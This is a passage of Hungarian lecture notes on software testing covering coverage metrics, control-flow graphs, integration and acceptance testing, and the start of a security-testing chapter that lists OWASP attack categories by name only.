annak eldöntésére, ellenõrzésére, hogy hol tartunk a tesztelési folyamatban. Ezt
legegyszerûbben egy teszt lefedettségi mátrixszal ábrázolhatjuk, amit az alábbi ábra mutat: 
Szoftver tesztelés
4-12
Használati esetek
Test eset 1 2 3 4 5
1
2
3
4
5
A szürkített cellák azt mutatják, hogy melyik teszteset melyik használati eset funkcióinak
tesztelésére szolgál. A teszt lefedettségi mátrix segíthet a tesz futtatások ütemezésében, és
ellenõrizhetõ segítségével, hogy minden használati esethez tartozik-e legalább egy teszt
eset.
4.3.6 Az elvárt eredmény elõállításának problémája
Az elõzõekben mindig feltételeztük, hogy az elvárt eredmény, amit a teszt futás kimenetével
össze tudunk hasonlítani rendelkezésünkre áll.
Ez azonban a gyakorlatban nem mindig ilyen egyszerû, mert az ellenõrzendõ modul
mûködése lehet nagyon bonyolult, sok számítási lépést igénylõ folyamat, amit manuálisan
nem tudunk elvégezni. A probléma lehetséges megoldásai:
• A valós feladatnál sokkal kisebb méretû feladatot adunk teszt esetként, amit kézzel is
végig lehet számolni.
• Ugyanazt a problémát más programmal is megoldatjuk, és annak az eredményét
használjuk fel a teszt kimenetének ellenõrzésére.
• Szimulációs szoftvert használunk.
• Bár a kimenetet számszerûen nem tudjuk ellenõrizni, de tudjuk, hogy az
eredménynek bizonyos szerkezeti sajátosságokat kell mutatnia.
Példaként említhetünk egy olyan projektet, amelyben jelen fejezet szerzõjének egy geofizikai
modellezõ rendszer programjának elkészítése volt a feladata. A matematikai modell egyik
része egy több százezer ismeretlenes lineáris egyenletrendszer együttható mátrixának a
felépítését és az egyenletrendszer megoldását igényelte. Nyilvánvaló, hogy ennek a
modulnak a kimenetét nem lehet úgy ellenõrizni, hogy kézzel kiszámítjuk az eredményt. A
tesztelés ezért több lépcsõben történt:
• Elõször egy erõsen redukált elemszámú (tíz körüli ismeretlent tartalmazó) feladatot
oldattunk meg, amelynek természetesen fizikai realitása nincs, de az eredményét
manuálisan is lehet ellenõrizni. A „manuális ellenõrzés” persze már ebben az esetben
is jelentheti segédprogramok igénybevételét.
• A következõ lépcsõ az együtthatómátrix valós értékei helyett olyan speciális értékek
beállítását jelentette, amellyel az egyenletrendszer megoldásának helyességét
könnyû tesztelni. (Például ha az együttható mátrix az egységmátrix, akkor a megoldás
vektornak azonosnak kell lennie a jobboldal vektorával.) 
Szoftver tesztelés
4-13
• Rendelkezésre állt olyan, korábban kifejlesztett és letesztelt program, amely az adott
fizikai probléma speciális, egyszerûsített eseteit tudta kezelni. Ugyanezt a problémát
a tesztelendõ programmal is megoldva, az eredmények összehasonlíthatók voltak.
• Lehetett olyan input adatokat generálni, amelyekhez tartozó eredménynek a fizika
törvényei szerinti meghatározott sajátosságokat kellett mutatnia: szimmetriát,
megadott peremfeltételekkel való egyezést stb. Ezekben az esetekben az kimenet
egyes elemeinek a numerikus helyességét nem lehetett ellenõrizni, csak a
törvényekkel való egyezõséget.
4.4 Struktúra alapú technikák
Ezeknek a módszereknek az alapja az a tapasztalat, hogy a programozási hibák gyakran a
vezérlési szerkezeteket érintik. A tesztelés célja tehát a kód struktúrájának a felderítése és
helyességének ellenõrzése, ezért a tesztesetek generálása a forráskód elemzése alapján
történik.
Ebben a szemléletben a tesztesetek megtervezése során az a cél, hogy a vizsgált kód minden
ágát végrehajtva vizsgáljuk annak mûködését. Mivel egy bonyolult kód végrehajtási útjainak
száma nagyon magas lehet, általában nem túl nagy egységek képezik a tesztelés tárgyát.
A kódbejárás alapját a kód matematikai modellje, a vezérlési folyamat gráf (control-flow
graph, CFG) képezi.
A vezérlési folyamat gráf egy olyan irányított gráf, amelyben a csomópontok a program
utasításainak felelnek meg, az irányított élek pedig a végrehajtásuk sorrendjét jelölik ki. Egy
döntési utasításnak megfelelõ csomópontból több él indul ki, a vezérlési ágak
összekapcsolódási pontjában elhelyezkedõ utasításhoz pedig több él fut be. A ciklust
visszafelé irányuló él reprezentálja.
A vezérlési folyamat gráf a forráskódból automatikusan elõállítható, erre megfelelõ
segédeszközök állnak rendelkezésre. A folyamat gráf elemzésére, különbözõ jellemzõinek
meghatározására pedig a matematika számos kidolgozott gráfelméleti algoritmust biztosít.
A tesztelés hatékonyságának mérésére mérõszámokat használhatunk. A mérõszámok
meghatározására szintén rendelkezésre állnak a megfelelõ algoritmusok és az azokat
végrehajtani képes eszközök.
4.4.1 A struktúra alapú technikák alkalmazási területei
Vezérlés intenzív alkalmazások
• Ebben a kategóriában valószínûleg igaz, hogy a hibák a sok esetben a vezérlési
szerkezeteket érintik. Algoritmus hibákat is kimutathat. 
Szoftver tesztelés
4-14
Tervezési hibák felderítése
• Elsõsorban logikai hibák (pl. elérhetetlen kódrészek)
Szabványok elõírásai
• Mivel mérõszámokkal minõsíthetõ, sok szabvány elõírja valamilyen strukturális
technika használatát.
4.4.2 A vezérlési folyamat gráf
A vezérlési szerkezetet a vezérlési folyamat gráf modellezi, egy program végrehajtási eset
pedig egy út bejárása ebben a gráfban. Ezért felületesen mondhatnánk, hogy a teljes
tesztelés valamennyi út bejárását jelenti.
Mivel azonban a feltételek nem mindig függetlenek egymástól, a bejárható utak száma
általában kevesebb, mint az összes út.
A ciklomatikus komplexitás (CK) a vezérlési gráfban megtalálható független utak maximális
száma. Két út független, ha mindkettõben létezik olyan pont vagy él, amelyik nem eleme a
másik útnak.
A ciklomatikus komplexitás értéke arra jellemzõ, hogy a program vezérlési szempontból
mennyire bonyolult.
Általános tesztelési cél, hogy a teszthalmaz fedje le a független utak egy maximális (további
független utakkal már nem bõvíthetõ) halmazát. Ennek a célnak a megvalósítását az alábbi
problémák nehezíthetik:
• Az ilyen utak halmaza nem egyedi, tehát ugyanahhoz a kódhoz akár több ilyen
halmazt is lehet rendelni, ami több teszteset halmazt is jelenthet.
• Mivel a ciklomatikus komplexitás a független utak számának felsõ korlátja, egyes
halmazok számossága lehet kisebb, mint a ciklometrikus komplexitás.
4.4.3 A strukturális tesztgenerálás lépései
A teszt generálás folyamata lényegében leírható az alábbi lépésekkel.
Vezérlési gráf generálása
Ez automatikusan végrehajtható a kód elemzésével.
CK (ciklomatikus komplexitás) számítása
Létezik rá algoritmus, és a kód elemzõ eszközök képesek ezt az értéket meghatározni.
Független utak maximális (CK db utat tartalmazó) halmazának generálása
Ebben a lépésben már adódnak problémák. Ha vezérlési gráf kört tartalmaz (márpedig
tartalmaz, mert elég nehéz értelmes kódot elképzelni ciklus nélkül), az elvben végtelen 
Szoftver tesztelés
4-15
számú út generálását tenné lehetõvé. Ne felejtsük el, hogy a vezérlési gráf nem tartalmaz
futás közbeni értékeket, így egy ciklus menetszáma (ami a valóságban természetesen véges)
a gráfból nem állapítható meg. Ez a probléma kezelhetõ, de a generálandó utak számának
növekedését jelenti. Különösen igaz ez az egymásba ágyazott ciklusok esetén. A struktúra
alapú tesztelési technikák legnagyobb kihívását éppen a ciklusok kezelése jelenti.
Bemenetek generálása a független utak bejárásához
Ebben a lépésben az okozhat problémát, hogy egy adott úthoz nem feltétlenül generálható
olyan bemeneti kombináció, amely annak a bejárását eredményezné. Ez persze nem jelenti
feltétlenül azt, hogy az adott út elemeit képezõ utasítások elérhetetlenek, csak azt, hogy egy
másik út részeként hajtódhatnak végre.
A tesztelés alaposságának ellenõrzése kód lefedettségi mérõszámokkal
Az idõk során számos ilyen mérõszámot dolgoztak ki, és megoldott ezen mérõszámok
automatikus számítása is. A mérõszámok általában 0 és 1 közé esõ értékek. Azt
mondhatnánk tehát, hogy a tesztelés akkor teljes, ha egy ilyen mérõszám értéke 1 (teljes
lefedettség), azonban:
• A teljes lefedettség sokszor csak irreálisan nagy teszteset halmazzal érhetõ el, ezért
inkább annak csak minél jobb megközelítésére törekedhetünk.
• A 100%-os lefedettség sem jelenti azt, hogy minden hibát megtaláltunk. (Erre
példákat az egyes mérõszámok ismertetésénél mutatunk.)
• Mivel a különbözõ lefedettségi mérõszámok más és más szempontból értékelik a
tesztelés alaposságát, célszerû többet is használni.
A lefedettség elemzés (coverage analysis) a mértékszámok tesztelés során történõ
használatának elmélete. A gyakorlat ugyanis azt mutatja, hogy a tesztesetek futtatási
sorendjének „ügyes” megválasztásával eleinte a felderített hibák számának gyors
növekedését lehet elérni, még viszonylag alacsony lefedettség esetén is. A teljes
lefedettséghez való közelítés során a késõbbiekben feltárt hibát száma fokozatosan csökken.
Különbözõ stratégiákkal tehát jelentõs költségeket lehet megtakarítani.
Itt hívnám fel arra a figyelmet, hogy a kód lefedettségi mutató nem azonos a hiba
lefedettséggel (amit nem is tudunk számítani, hiszen ahhoz ismerni kellene a programban
levõ hibák számát). A kód lefedettség a tesztelés alaposságát méri, a hiba lefedettség az
eredményességét. A tapasztalatok alapján azonban abban bízhatunk, hogy az alapos
tesztelés az eredményességet is növeli.
4.4.4 Tesztminõségi mérõszámok
Ebben az alpontban az alábbi, gyakrabban használt kód lefedettségi mérõszámok számítási
módjait és jelentését tekintjük át
• utasítás lefedettség, 
Szoftver tesztelés
4-16
• ág lefedettség (vagy döntés lefedettség),
• út lefedettség.
4.4.4.1 Utasítás lefedettség
Számítási módja:
S(c) = s/S
ahol s a tesztelés során legalább egyszer végrehajtott, S pedig a program összes
utasításainak a száma
A 100% még nem biztosíték arra, hogy a teljes tesztelés minden hibát megtalál.
Egyszerû példa a fenti problémára (hibás kódrészlet):
int a=5 ;
x= …;
if (x>0) a = 10;
a = 20;
• Az utasítás lefedettség teszt 100%, mert minden sorra rákerül a vezérlés.
• Ha nem volt olyan teszt, amely során a feltétel igaz értéket vesz fel, nem derül ki a
hiba.
4.4.4.2 Ág lefedettség (döntés lefedettség)
Számítási módja:
D(c) = d/D
ahol d az elágazási utasításokban szereplõ feltételek kimeneteinek tesztelés során
bekövetkezett értékeinek száma, D pedig a program összes elágazás utasításaiban szereplõ
feltételeinek lehetséges száma.
A döntés lefedettség tehát akkor teljes, ha a programban szereplõ összes döntés minden
lehetséges kimenete elõfordult a tesztelés során.
A 100%-os lefedettség ugyan alaposabb tesztelést eredményez, mint az utasítás
lefedettsége, de itt is van ellenpélda:
if (felt1 && (felt2 || fuggveny() ) )
 u1;
else
 u2;
Szoftver tesztelés
4-17
Ahol felt1 és felt2 logikai kifejezések
A teljes lefedettséghez két teszteset szükséges, hiszen egy feltételnek két lehetséges
kimente van. Ez a két teszteset lehet például:
• felt1 és felt2 igaz – ekkor az elágazás feltétele igaz,
• felt1 hamis, - ekkor az elágazás feltétele hamis.
Ebben a két tesztesetben egyszer sem volt szükség a harmadik operandus kiértékelésére,
tehát a függvény nem hívódik meg. Ha abban van hiba, az felderítetlen marad.
4.4.4.3 Út lefedettség
Számítási módja:
P(c) = p/P
ahol p a tesztelés során bejárt utak száma, P pedig a vezérlési gráf összes útjainak a száma
Teljes út lefedettség teljes utasítás és ág lefedettséget biztosít.
Nagyon szigorú mérõszám, mert
• Az összes utak száma nagyon nagy lehet, ezért a tesztesetek generálása és lefuttatása
erõforrás igényes.
• A vezérlési gráfban lehetnek nem bejárható utak az egymást kizáró feltételek miatt,
tehát a teljes lefedettség nem is mindig elérhetõ.
4.4.5 A struktúra alapú tesztek szerepe
A fenti rövid bevezetõbõl is látszik, hogy a struktúra alapú tesztelés bonyolult és erõforrás
igényes feladat. Végrehajtásához speciálisan erre a célra fejlesztett eszközök kellenek, mert
manuális végrehajtása a bonyolult algoritmusok és a szükséges tesztesetek nagy száma miatt
legfeljebb mintapéldákon lehetséges.
Bonyolultsága ellenére sem mellõzhetõk ezek a tesztek a biztonság-kritikus rendszerek
esetén. Az ilyen rendszereknél a program váratlan viselkedése egy adott helyzetben akár
emberéleteket is veszélyeztethet, vagy jelentõk károkat okozhat. Ha a teljes lefedettséget
minnél jobban megközelítõ, alapos tesztelésnek vetjük alá ezeket a rendszereket, a váratlan
viselkedés valószínûsége az elfogadható kockázati szint alá csökkenthetõ.
A tesztek során alkalmazott lefedettségi mutatók alkalmazhatók az utasításoknál nagyobb
absztrakciós szintû struktúrákra is. Ilyenkor a vezérlési folyamat gráf elemei lehetnek például
alrendszerek, modulok, interfészek, vagy akár a menüstrukrúra elemei. Az integrációs
tesztek esetén ilyen módon módon mérhetjük, hogy a végrehajtott teszt készletek a rendszer
elemeit mennyire alaposan fedték le. 
Szoftver tesztelés
4-18
4.5 Gyakorlat alapú technikák
A gyakorlat alapú technikák a tesztelõ szakember tapasztalatain alapuló ad-hoc, nem
szisztematikus módszerek. Alkalmazhatók a formálisabb technikák kiegészítésére, de vannak
olyan esetek, amikor fõszerephez jutnak. Ilyenek lehetnek az alábbiak:
• Nincs olyan, megfelelõ minõségû specifikáció, amibõl levezethetõk a tesztesetek.
• Nincs elég idõ a megfelelõen megtervezett tesztelési folyamat lebonyolítására.
4.5.1 Hiba becslés (Error guessing)
Ez egy nagyon egyszerû módszer, ami kihasználja a tesztmérnök hasonló alkalmazásokkal
szerzett tapasztalatait, és lehetõvé teszi olyan speciális tesztesetek azonosítását, amelyeket
a szisztematikus technikákkal nehéz feltárni. A szisztematikus módszerek kiegészítéseként a
teszteseteket a korábbi rendszerek ismertté vált tipikus problémái ismeretében egészíti ki.
A módszer hátránya, hogy a hatékonysága esetleges, elsõsorban a tesztelõ gyakorlatán,
intuíciós képességein, és azon múlik, hogy részt vett-e korábban hasonló rendszerek
fejlesztésében. Elõnye viszont, hogy a területen gyakorlott felhasználókat is be lehet vonni a
tesztesetek tervezésébe, felhasználva egy másik nézõpontból származó információkat.
A hiba becslés módszerét strukturáltabbá lehet tenni azzal, hogy elkészítünk egy potenciális
hibalistát. A lista a tesztelõ és a felhasználó elõzetes tapasztalatai alapján készülhet, és
segítheti a szisztematikus módszereket, de további teszteseteket is generálhat.
4.5.2 Felderítõ tesztelés (Exploratory testing)
Ez a módszer kombinálja a tesztelõ tapasztalatait és a strukturált tesztelési módszereket.
Hasznos lehet abban az esetben, ha a specifikáció elnagyolt, hiányos, vagy a fejlesztés
határideje nagyon feszített tempót igényel. Ez a technika lehetõvé teszi, hogy a korlátozott
tesztelési idõt jobban kihasználjuk azáltal, hogy segít megtalálni a legfontosabb,
mindenképpen végrehajtandó teszteseteket.
4.6 Ellenõrzõ kérdések
4.7 Irodalomjegyzék
Brian Hambling (Editor), Peter Morgan, Angelina Samaroo, Geoff Thompsom, Peter Wiliams:
Software Testing; an ISEB Foundation. The British Computer Society (BCS), 2007. ISBN
1.902505-79-4 
Szoftver tesztelés
4-19
Derk-Jan de Grood: TestGoal; Result-Driven Testing. Springer, 2008, ISBN 978-3-540-78828-7
Dr. Sziray József, Dr benyó Balázs, Heckenast Tamás: Szoftver-minõségbiztosítás, 2007.
Elektronikus jegyzet
ftp://jegyzet.sth.sze.hu/!BSc/Szoftverminosegbiztositas/SW_minosegbizt.pdf
 
Szoftver tesztelés
4-20
Tartalomjegyzék
4 Teszt tervezési technikák ............................................................................ .................... 4-1
4.1 Alapfogalmak ...................................... ................................................... ................... 4-1
4.1.1 Tesztelés alanya (test condition) .................................................................... ... 4-1
4.1.2 Teszt eset ........................................ ................................................... ................ 4-2
4.1.3 Teszt specifikáció ................................................................................... ............ 4-2
4.1.4 Tesztkészlet ...................................... ................................................... .............. 4-2
4.1.5 Hibamodell ........................................ ................................................... ............. 4-3
4.1.6 Teszt folyamat .................................... ................................................... ............ 4-3
4.1.7 Teszt lefedettség .................................................................................... ........... 4-3
4.2 A teszt tervezési technikák fajtái ................................................................... ........... 4-4
4.3 Specifikáció alapú technikák ......................................................................... ............ 4-4
4.3.1 Ekvivalencia particionálás (Equivalence partitioning) ....................................... 4-6
4.3.2 Határérték analízis (Boundary value analysis) .................................................. 4-6
4.3.3 Ok-hatás analízis (Cause-effect analysis) .......................................................... 4 -7
4.3.4 Véletlenszerû adatok generálása .................................................................... 4 -11
4.3.5 Használati eset (use case) tesztelés ................................................................ 4-11
4.3.6 Az elvárt eredmény elõállításának problémája ............................................... 4-12
4.4 Struktúra alapú technikák ............................................................................ ........... 4-13
4.4.1 A struktúra alapú technikák alkalmazási területei .......................................... 4-13
4.4.2 A vezérlési folyamat gráf ............................................................................ ..... 4-14
4.4.3 A strukturális tesztgenerálás lépései ............................................................... 4-14
4.4.4 Tesztminõségi mérõszámok ............................................................................ 4-15
4.4.4.1 Utasítás lefedettség ................................................................................. 4-16
4.4.4.2 Ág lefedettség (döntés lefedettség) ........................................................ 4-16
4.4.4.3 Út lefedettség ....................................................................................... ... 4-17
4.4.5 A struktúra alapú tesztek szerepe ................................................................... 4-17
4.5 Gyakorlat alapú technikák ............................................................................ .......... 4-18
4.5.1 Hiba becslés (Error guessing) ........................................................................ .. 4-18
4.5.2 Felderítõ tesztelés (Exploratory testing) ......................................................... 4- 18
4.6 Ellenõrzõ kérdések ................................................................................... ............... 4-18
4.7 Irodalomjegyzék ...................................................................................... ............... 4-18
Szoftver tesztelés
4-21 
Szoftver tesztelés
5-1
5 Integrációs tesztek
Az integrációs tesztek az egységteszteket követik. Az egység teszt szorosan kapcsolódik az
implementációs fázishoz, és biztosítja, hogy a részegységek önmagukban már helyesen
mûködnek. Így ha az integrációs tesztek során hibát észlelünk, az feltehetõleg a modulok
együttmûködésébõl adódik.
Az integrációs teszteknek következõ fázisait különböztetjük meg:
• technikai integrációs teszt (Integration Level Testing, ILT),
• rendszerteszt (System Level Testing , SLT),
• elfogadtatási teszt (User Acceptance Testing, UAT).
Ezek különböznek az integráltság szintjében, és részben a céljaikban is.
5.1 Integration Level Testing (ILT)
Célja az együttmûködõ egységek vizsgálata. Ezért a teszteléshez egy részrendszert állítunk
össze a már önmagában tesztelt elemekbõl. Ezek többnyire csak technikai, nem funkcionális
részrendszerek, ezért probléma lehet a megfelelõ tesztesetek elõállítása.
Az ILT szemlélete elsõsorban verifikációs, tehát a hibák megtalálására irányul.
5.1.1 Integrációs stratégiák
A részrendszerek összeépítésére és a tesztesetek megtervezésére és futtatására különbözõ
stratégiák alakultak ki.
5.1.1.1 "Big-bang" integráció
Feltételezzük, hogy a rendszer minden egység rendelkezésre áll, és ezekbõl egybõl a teljes
rendszer építjük fel, azaz valójában az ITL kimarad, és egybõl a System Level Testing
következik. Elõnye, hogy a testeseteket könnyebben le lehet vezetni a követelmény
analízisbõl és nagyon kevés segédkódot kell írni a tesztek végrehajtásához. Hátránya viszont,
hogy nagyon nehéz a hibák okát megtalálni, mert egy hibajelenséget több hiba együttese is
okozhat (a hibák következményei "összemosódnak"). Ezért legfeljebb nagyon egyszerû
rendszerek esetén alkalmazható
5.1.1.2 Inkrementációs integrációs és tesztelési stratégia
Ebben az esetben a rendszer elemeit fokozatosan integráljuk, és minden egyes integrációs
szinten teszteket hajtunk végre. A folyamat tehát az alábbi lépésekbõl áll:
• Néhány elemet (modult vagy részrendszert) kombinálunk.
• Olyan teszteket futtatunk, amelyek csak az összeépített elemeket igénylik.
• Ha minden teszt sikeres, újabb elemeket teszünk hozzá a rendszerhez.
• További teszteseteket tervezünk, amelyek az új elemek meglétét is igénylik.
• Minden eddigi tesztet újra lefuttatunk. 
Szoftver tesztelés
5-2
A fenti iterációt addig folytatjuk, amíg a teljes rendszert összeépítettük, és azon valamennyi
teszt sikeresen lefutott.
Példa:
5-1. ábra Iterációs teszt
Figyeljük meg, hogy a kibõvített rendszeren újra kell futtatnunk az elõzõleg már sikeresen
lefutott teszteket is, hiszen nem lehetünk biztosak abban, hogy az újabb modulok
integrációja nem okoz hibát a korábbi modulok mûködésében. Ez a futtatandó tesztesetek
számának exponenciális növekedését jelenti, ami egy bonyolult rendszer esetén nagyon
erõforrás igényessé teszi a folyamatot.
Mivel a tesztelés tárgya mindig csak egy részrendszer, annak mûködtetéséhez tesztelési
környezetet kell biztosítani, ami segédkódok írását jelenti. A biztosítandó tesztelési
környezet attól függ, milyen integrációs módszert alkalmazunk. Elvben két lehetséges
megközelítés közül választhatunk:
• top-down integráció
• bottom-up integráció
Többnyire a két megközelítés valamilyen ötvözetét használják a gyakorlatban.
5.1.1.3 Top-down integráció 
Szoftver tesztelés
5-3
5-2. ábra Top-down integráció
Folyamata:
• A hierarchia legfelsõ szintjén álló elem tesztelésével kezdjük.
• Az egy szinttel lejjebb álló elemek viselkedését és iterface-ét szimuláló ideiglenes
elemek (stub) szükségesek.
• Ha a teszt sikeres, az ideiglenes elemeket a valódiakkal helyettesítjük, az általuk
használtakat pedig újabb ideiglenes elemekkel szimuláljuk.
Elõnyei:
• Jól illeszkedik a top-down programfejlesztési módszerekhez.
• Egy modul a megírása után rögtön tesztelhetõ.
• Az esetleges tervezési hibák korán kiderülnek, és idejében orvosolhatók.
• Viszonylag korán rendelkezésre áll egy korlátozott képességû rendszer.
Hátrányai:
• Bonyolult lehet a szimulációt végzõ ideiglenes rutinok megírása.
• A hierarchia felsõ szintjein álló modulok sokszor nem szolgáltatnak outputot. A
teszteléshez külön eredmény-generáló "betétek" szükségesek.
5.1.1.4 Bottom-up integráció 
Szoftver tesztelés
5-4
5-3. ábra Bottom-up tesztelési stratégia
Folyamata:
• Elõször a legalsó szinten levõ modulokat teszteljük, majd a hierarchiában felfelé
haladunk.
• Ehhez a felsõ szinteket szimuláló tesztelési környezetet (test driver) kell írni.
• Ha a teszt sikeres, a teszt driver-eket a valódi implementált elemekre cseréljük, és a
következõ szintet helyettesítjük test driver-ekkel.
5.2 System Level Testing (SLT)
A rendszer összes komponensének teljes körû (funkcionális, nem funkcionális) tesztelése.
Feladata annak megállapítása, hogy a rendszer kiadható-e a megrendelõnek. Ez tehát egy
végsõ ellenõrzési fázis a fejlesztési folyamatban. Szokás elnevezése még: "release test", a
tesztelés tárgyát képezõ rendszerváltozat pedig gyakran nevezik "alpha version"-nek.
Bár a tesztelési munka még fejlesztõ szervezeten belül folyik, szükséges az éles használat
környezetének minél pontosabb szimulációja.
A tesztelés célja kettõs:
• Verifikációs: a rendszer olyan hibáinak megtalálása, amelyek az eddigi tesztelési
tevékenységek során nem mutatkoztak meg.
• Validációs: fõleg a nem funkcionális követelmények tesztelése segítségével
meggyõzõdni arról, hogy a felhasználó céljainak megfelelõ a rendszer mûködése.
Ezen célok elérésére a rendszert több szempont szerint tesztelhetjük.
5.2.1 Szolgáltatás tesztelés
Célja annak megállapítása, hogy a rendszer minden funkcionális követelményt implementál,
és azok helyesen mûködnek. 
Szoftver tesztelés
5-5
5.2.2 Mennyiségi tesztelés
A szoftver mûködését nagy mennyiségû adattal teszteljük a kapacitáskorlátok ellenõrzésére.
Ellenõrizzük, hogy az adatmennyiség nem okoz-e hibás mûködést. Végrehajtási / válasz
idõket is figyelhetünk, mérhetünk, amely már a terhelési tesztek elõkészítését jelenti.
5.2.3 Terheléses tesztelés (Stressz-tesztelés)
A tesztelt rendszert valamilyen szempontból erõs terhelésnek teszi ki. Fontos feladata a
megfelelõ válaszidõk ellenõrzése. Ennek érdekében:
• Vizsgálni kell, hogy a rendszer adott idõkorláton belül hogyan teljesít nagy
mennyiségû adatokon dolgozva.
• Intenzív feldolgozást kívánó helyzeteket kell teremteni, melyek szélsõségesek, de
elõfordulhatnak.
• A robosztusság ellenõrzésére érdemes a terhelést olyan szintre is emelni, amely
(elvileg) a használat során nem fordulhat elõ.
5.2.4 Használhatósági tesztelés
A rendszer egy meghatározott felhasználó által, egy meghatározott felhasználási körben
használva, meghatározott célok hatékony és produktív elérésére, mennyire kielégítõ és
mennyire vezet megelégedésre. Minden felhasználói szerepkört, minden használati módot
meg kell vizsgálni.
5.2.5 Biztonsági tesztelés
Az adatbiztonsággal és adatvédelemmel kapcsolatos hibák vizsgálata. A mai, elosztott
architektúrájú, gyakran (legalább részben) Web alapú rendszerek esetén egyre nagyobb a
jelentõsége, ezért ezzel e kérdéssel egy külön fejezetben is foglalkozunk.
5.2.6 Teljesítménytesztelés
A teljesítmény vagy a hatékonyság mérése különbözõ terheléseknél és konfigurációkra
meghatározott válaszidõk és feldolgozási sebességek formájában.
5.2.7 Konfigurációtesztelés
Különbözõ környezetek (hardver, operációs rendszer, egyéb szoftver installációk)
lehetségesek.
Ha a programnak korábbi rendszerekhez kell kapcsolódniuk, vagy a program egy korábbi
változatát váltják le: ellenõrizni kell a kompatibilitást vagy a konverziós eljárásokat.
5.2.8 Megbízhatósági tesztelés
Ha program céljai között megbízhatósággal kapcsolatos speciális kitételek szerepelnek.
A megbízhatósági teszteknek adott esetben ki kell terjedniük a rendszer programozásihardver- vagy adathibák bekövetkezte utáni felállására, mûködésbe visszaállására. 
Szoftver tesztelés
5-6
5.2.9 Dokumentációtesztelés
Felhasználói és fejlesztési dokumentumokra egyaránt vonatkozik.
A fejlesztési dokumentáció esetén annak teljességét és az elkészült rendszerrel való
összhangját kell vizsgálni.
A felhasználói dokumentációban szereplõ összes illusztratív példát le kell képezni
tesztesetekké és végre is kell hajtani velük a tesztelést.
5.3 User Acceptance Testing (UAT)
Feladata annak megállapítása, hogy a rendszer éles üzembe állítható-e.
Célja a felhasználó és minden haszonélvezõ (stakeholder) elégedettségének vizsgálata.
Általában a megrendelõ telephelyén, annak közremûködésével, és a végleges üzemeltetési
körülmények között kell végrehajtani.
A használható tesztelési módszerek hasonlóak, mint a SLT esetén, de azok közül csak a
felhasználó számára releváns eseteket kell bemutatni.
Ez a szint elsõsorban verifikációs szemléletû, tehát az a jó teszt, amely sikeres mûködést
produkál.
Lehet verifikációs célja is (olyan hibák kimutatására, amelyek csak a végleges mûködtetõ
környezetben vizsgálhatók.)
Egy speciális UAT módszer a béta verzió kibocsátása. A béta verziót általában egy korlátozott
felhasználói kör kapja meg, akiktõl elvárható, hogy az észlelt hibákat rendszeresen jelentik a
fejlesztõknek.
 
Szoftver tesztelés
5-7
Tartalomjegyzék
5 Integrációs tesztek .................................................................................. ........................ 5-1
5.1 Integration Level Testing (ILT) ...................................................................... ............ 5-1
5.1.1 Integrációs stratégiák ............................................................................... ......... 5-1
5.1.1.1 "Big-bang" integráció ................................................................................ . 5-1
5.1.1.2 Inkrementációs integrációs és tesztelési stratégia .................................... 5-1
5.1.1.3 Top-down integráció .................................................................................. 5-2
5.1.1.4 Bottom-up integráció ................................................................................. 5-3
5.2 System Level Testing (SLT) ........................................................................... ............. 5-4
5.2.1 Szolgáltatás tesztelés ............................................................................... ......... 5-4
5.2.2 Mennyiségi tesztelés ................................................................................. ........ 5-5
5.2.3 Terheléses tesztelés (Stressz-tesztelés) ............................................................ 5-5
5.2.4 Használhatósági tesztelés............................................................................. ..... 5-5
5.2.5 Biztonsági tesztelés ................................................................................. .......... 5-5
5.2.6 Teljesítménytesztelés ................................................................................ ........ 5-5
5.2.7 Konfigurációtesztelés ................................................................................ ........ 5-5
5.2.8 Megbízhatósági tesztelés ............................................................................. ..... 5-5
5.2.9 Dokumentációtesztelés ................................................................................ ..... 5-6
5.3 User Acceptance Testing (UAT) ........................................................................ ........ 5-6
Szoftver tesztelés
6-1
6 Biztonsági tesztelés
Ez a fejezet áttekinti a biztonsági támadások leggyakoribb típusait. Az itt leírt biztonsági
támadások a www.owasp.org oldalon található szabad cikkek fordításai.
A támadások azok a technológiák, amiket a támadók használnak, hogy kihasználják az
alkalmazások sebezhetõ pontjait. A támadásokat gyakran tévesztik össze a sebezhetõ
pontokkal. Egy támadás leírása azt mondja el, hogy mit tenne a támadó a gyengeség
kihasználására, nem pedig az alkalmazás gyenge pontjait ismerteti.
Ebben a fejezetben a legfontosabb biztonsági támadásokat ismertetjük, hogy a tesztelés
során tudjuk, minek lesz kitéve az alkalmazásunk. Ha ismerjük a biztonsági támadásokat,
akkor a tesztek során kipróbálhatjuk, hogy alkalmazásunk ellen áll-e a támadásnak. Ha igen,
akkor a kiadott szoftverünk kisebb kockázatot jelent a használójának és így nagyobb értéket
képvisel. A támadás ellenállóság egyrészt verseny elõny, másrészt az elkérhetõ magasabb ár
fedezi a tesztelés extra költségeit. Az extra költségek a magasan képzett tesztelõk magasabb
munkadíjából és a támadás ellenállóság tesztelésének viszonylag idõigényes volta jelenti.
Ugyanakkor a támadás ellenállóság vizsgálatához nem elég csak a legfontosabb támadásokat
ismerni, hiszen újabb és újabb támadási módszereket fejlesztenek ki az IT rendszerek
feltörésére specializálódott hacker-ek.
A támadás ellenállóság tesztelése általában feketedobozos teszt. Történhet a rendszer
kiadása elõtt vagy után is. Ha utána történik, akkor általában etikus törési kísérletrõl
beszélünk. Ehhez általában külsõ szakembereket, fehér kalapos hacker-eket szoktak felkérni.
Ha a kiadás elõtt történik, akkor általában a legmagasabban képzett belsõ tesztmérnökök
feladata. Ez a fejezet nekik szól, de a szükséges ismereteknek csak egy részét tartalmazza.
A biztonsági támadások legfontosabb típusai (támadás fajtái – konkrét támadások):
• „Mûködés ellehetetlenítése – Cache Mérgezés” (Abuse of Functionality - Cache
Poisoning )
 (Data Structure Attacks - Overflow Binary Resource fájl )
 „Ártalmas kód beágyazása – logikai/idõzített bomba (Embeeded Malicious Code -
Logic/time bomb)
 „Trójai” (Troyan Horse)
 „Azonosítási folyamat kihasználása – Account kizárási támadás” (Exploitation of
Authentication - Account lockout attack)
 „Befecskendezés – Közvetlen statikus kód befecskendezése” (Injection - Direct Static
Code Injection)
Szoftver tesztelés
6-2
 „Útkeresztezési támadás” (Path Traversal Attack)
 „Próbálgatós technológiák – nyers erõ támadás” (Probabilistic Techniques - Brute
force attack)
 „Protokol manipuláció – http válasz szétválasztás” (Protocol Manipulation - Http
Response Splitting)
 „Forrás kimerítés – aszimmetrikus erõforrások elfogyasztása (erõsítés)” (Resource
Depletion - Asymmetric resource consumption (amplification))
 „Erõforrás manipuláció – kémprogram” (Resource Manipulation – Spyware)
 „Szimatoló támadás – Hálózati lehallgatás” (Sniffing Attacks - Network
Eavesdropping)
 „Átverés – oldalakon keresztüli kérelem hamisítás (CSRF)” (Spoofing - Cross-Site
Request Forgery (CSRF))
